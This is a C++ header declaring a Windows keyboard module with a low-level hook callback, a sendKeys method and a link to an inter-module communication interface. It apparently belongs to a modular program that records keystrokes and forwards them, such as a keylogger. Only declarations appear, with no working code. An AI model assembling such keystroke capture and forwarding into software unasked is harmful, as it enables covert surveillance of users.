//
// Created by Benoit Hamon on 10/4/2017.
//

#pragma once

#include <Windows.h>
#include <boost/shared_ptr.hpp>

#include "../IModule.hpp"
#include "../IModuleCommunication.hpp"

class ModuleKeyboard : public IModule {
public:
    ModuleKeyboard(IModuleCommunication *);

public:
    void start() override;

public:
    static boost::shared_ptr<ModuleKeyboard> create(IModuleCommunication *);

public:
    static LRESULT CALLBACK hookCallback(int nCode, WPARAM wParam, LPARAM lParam);

private:
    void sendKeys();

private:
    IModuleCommunication *_moduleCommunication;
    bool _running;
};
